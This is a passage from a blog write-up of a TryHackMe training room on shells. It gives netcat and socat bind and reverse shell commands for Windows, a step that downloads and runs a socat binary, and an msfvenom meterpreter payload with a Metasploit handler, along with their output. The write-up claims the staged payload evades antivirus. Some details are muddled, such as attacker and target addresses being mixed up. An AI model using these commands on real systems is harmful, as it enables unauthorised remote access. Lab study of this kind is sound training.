</code></pre><p>Activate the <code>bind shell</code> from the attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-nv%20%3Ctarget-ip%3E%204430%0A%0AThe%20%60bind%20shell%60%20in%20target%20machine%20would%20have%20spawned%20at%20the%20%60netcat%60%20activator.%0A%7B%25%20capture%20code%20%25%7D%7B%25%20raw%20%25%7DConnection%20to%20%3Ctarget-ip%3E%204430%20port%20[tcp/*]%20succeeded!%0AMicrosoft%20Windows%20[Version%2010.0.17763.1637]%0A(c)%202018%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5C%3E" type="button"></button></div></div><pre><code>nc -nv &lt;target-ip&gt; 4430

The `bind shell` in target machine would have spawned at the `netcat` activator.
{% capture code %}{% raw %}Connection to &lt;target-ip&gt; 4430 port [tcp/*] succeeded!
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\&gt;
</code></pre><h3 id="reverse-socat-shell---windows">Reverse Socat shell - Windows</h3><p><code>Socat</code> can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">here</a> and windows is <a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">here</a>.</p><p><code>Socat</code> shell is stabilised and sanitised by default and does not need additional configurations after gaining <code>shell</code>.</p><p>Create a <code>socat</code> listener in target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP-L:443%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:443 FILE:`tty`,raw,echo=0
</code></pre><p>Use <code>xfreerdp</code> to test rdp connection with newly created user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="xfreerdp%20/dynamic-resolution%20+clipboard%20/cert:ignore%20/v:%3Ctarget-ip%3E%20/u:Administrator%20/p:'%3Cpassword%3E'" type="button"></button></div></div><pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;target-ip&gt; /u:Administrator /p:'&lt;password&gt;'
</code></pre><p>Activate the <code>reverse shell</code> from the target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP:%3Ctarget-ip%3E:443%20EXEC:%22cmd.exe%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>socat TCP:&lt;target-ip&gt;:443 EXEC:"cmd.exe",pty,stderr,sigint,setsid,sane
</code></pre><p>The <code>reverse shell</code> in attacking machine would have spawned at the <code>socat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Microsoft%20Windows%20[Version%2010.0.17763.1637]%0A(c)%202018%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5C%3E" type="button"></button></div></div><pre><code>Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\&gt;
</code></pre><h3 id="bind-socat-shell---windows">Bind Socat shell - Windows</h3><p><code>Socat</code> can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">here</a> and windows is <a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">here</a>.</p><p><code>Socat</code> shell is stabilised and sanitised by default and does not need additional configurations after gaining <code>shell</code>.</p><p>Use <code>xfreerdp</code> to test rdp connection with newly created user.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="xfreerdp%20/dynamic-resolution%20+clipboard%20/cert:ignore%20/v:%3Ctarget-ip%3E%20/u:Administrator%20/p:'%3Cpassword%3E'" type="button"></button></div></div><pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;target-ip&gt; /u:Administrator /p:'&lt;password&gt;'
</code></pre><p>Create a <code>socat</code> listener in target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="socat%20TCP-L:4430%20EXEC:%22powershell.exe%22,pipes" type="button"></button></div></div><pre><code>socat TCP-L:4430 EXEC:"powershell.exe",pipes
</code></pre><p>Activate the <code>bind shell</code> from the attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP:10.10.91.162:4430%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.10.91.162:4430 FILE:`tty`,raw,echo=0
</code></pre><p>The <code>bind shell</code> in target machine would have spawned at the <code>socat</code> activator.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Windows%20PowerShell%0ACopyright%20(C)%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0APS%20C:%5C%3E" type="button"></button></div></div><pre><code>Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\&gt;
</code></pre><h3 id="msfvenom-meterpreter-shell---windows">Msfvenom meterpreter shell - Windows</h3><p>Use <code>msfvenom</code> to create an <code>exe</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/x64/meterpreter/reverse_tcp%20-f%20exe%20-o%20shell.exe%20LHOST=%3Ctarget-ip%3E%20LPORT=443" type="button"></button></div></div><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=&lt;target-ip&gt; LPORT=443
</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0A[-]%20No%20arch%20selected,%20selecting%20arch:%20x64%20from%20the%20payload%0ANo%20encoder%20specified,%20outputting%20raw%20payload%0APayload%20size:%20510%20bytes%0AFinal%20size%20of%20exe%20file:%207168%20bytes%0ASaved%20as:%20shell.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
</code></pre><p>Use <code>msfconsole</code> to create <code>multi/handler</code> and load the payload <code>linux/x64/shell/reverse_tcp</code>, which is <code>staged</code>, and hence can evade firewalls and antivirus. The <code>exploit</code> is given in background, and hence sessions will not be loaded by default.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20use%20multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Ctarget-ip%3E%0ALHOST%20=%3E%20%3Ctarget-ip%3E%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LPORT%20443%0ALPORT%20=%3E%20443%0Amsf5%20exploit(multi/handler)%20%3E%20set%20payload%20windows/x64/meterpreter/reverse_tcp%0Apayload%20=%3E%20windows/x64/meterpreter/reverse_tcp%0Amsf5%20exploit(multi/handler)%20%3E%20exploit%20-j%0A[*]%20Exploit%20running%20as%20background%20job%203.%0A[*]%20Exploit%20completed,%20but%20no%20session%20was%20created.%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Ctarget-ip%3E:443%20" type="button"></button></div></div><pre><code>msf5 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST &lt;target-ip&gt;
LHOST =&gt; &lt;target-ip&gt;
msf5 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on &lt;target-ip&gt;:443 
</code></pre><p>Copy <code>shell.exe</code> payload file and execute, which will activate the <code>reverse shell</code></p><p>The payload would have activated a session in <code>msfconsole</code> teminal. Bring the session to foreground for interaction and gain <code>meterpreter</code> shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/handler)%20%3E%20[*]%20Sending%20stage%20(201283%20bytes)%20to%2010.10.91.162%0A[*]%20Meterpreter%20session%201%20opened%20(%3Ctarget-ip%3E:443%20-%3E%2010.10.91.162:50140)%20at%202021-04-13%2017:06:53%20+0100%0A%0Amsf5%20exploit(multi/handler)%20%3E%20sessions%201%0A[*]%20Starting%20interaction%20with%201...%0A%0Ameterpreter%20%3E" type="button"></button></div></div><pre><code>msf5 exploit(multi/handler) &gt; [*] Sending stage (201283 bytes) to 10.10.91.162
[*] Meterpreter session 1 opened (&lt;target-ip&gt;:443 -&gt; 10.10.91.162:50140) at 2021-04-13 17:06:53 +0100

msf5 exploit(multi/handler) &gt; sessions 1
[*] Starting interaction with 1...

meterpreter &gt;
</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/shell/" class="post-tag no-text-decoration" >shell</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-common-linux-privesc/"><div class="card-body"> <span class="timeago small" > Apr 2 <i class="unloaded">2021-04-02T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Common Linux Privesc</h3><div class="text-muted small"><p> Common Linux Privesc This room contains info about linux privilege escalation methods. For complete tryhackme path, refer the link. Task 4 - Enumeration References LinEnum Reference ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-linux-privesc/"><div class="card-body"> <span class="timeago small" > Apr 3 <i class="unloaded">2021-04-03T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Linux Privesc</h3><div class="text-muted small"><p> Linux Privesc This room contains detailed info about linux privilege escalation methods. For complete tryhackme path, refer the link. Refer link for quick reference on linux privilege escal...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-active-directory-basics/"><div class="card-body"> <span class="timeago small" > Mar 21 <i class="unloaded">2021-03-21T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Active Directory Basics</h3><div class="text-muted small"><p> Active Directory Basics This room contains info about Windows Active Directory and tools to enumerate them. For complete tryhackme path, refer the link Task 8 - Hands-On Lab References ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-hackpark/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - HackPark</p></a> <a href="/posts/tryhackme-common-linux-privesc/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Common Linux Privesc</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
